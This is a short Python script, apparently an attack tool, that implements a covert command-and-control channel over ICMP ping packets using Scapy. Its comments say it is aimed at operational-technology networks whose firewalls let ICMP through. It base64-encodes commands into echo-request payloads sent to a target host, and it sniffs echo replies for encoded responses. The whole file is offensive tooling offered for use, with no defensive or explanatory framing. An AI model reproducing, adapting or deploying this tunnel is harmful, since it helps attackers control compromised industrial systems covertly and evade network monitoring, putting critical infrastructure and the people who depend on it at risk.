# icmp_c2_tunnel.py - C2 over ICMP (ping)
# ICMP often allowed through OT firewalls for diagnostics

from scapy.all import *
import base64

class ICMPC2:
    def __init__(self, target_ip):
        self.target = target_ip

    def send_command(self, command):
        """
        Encode command in ICMP payload
        """
        # Encode command
        encoded_cmd = base64.b64encode(command.encode())

        # Craft ICMP packet with command in payload
        packet = IP(dst=self.target) / ICMP(type=8, code=0) / Raw(load=encoded_cmd)

        # Send packet
        send(packet, verbose=0)

        print(f"[+] Command sent via ICMP to {self.target}")

    def receive_response(self):
        """
        Sniff for ICMP replies with encoded response
        """
        def packet_callback(pkt):
            if pkt.haslayer(ICMP) and pkt[ICMP].type == 0:  # Echo Reply
                if pkt.haslayer(Raw):
                    # Decode response
                    response = base64.b64decode(pkt[Raw].load)
                    print(f"[+] Response: {response.decode()}")
                    return response

        # Sniff for replies
        sniff(filter=f"icmp and src {self.target}", prn=packet_callback, count=1, timeout=10)

# Usage
icmp_c2 = ICMPC2("192.168.10.10")
icmp_c2.send_command("read_sensors")
icmp_c2.receive_response()
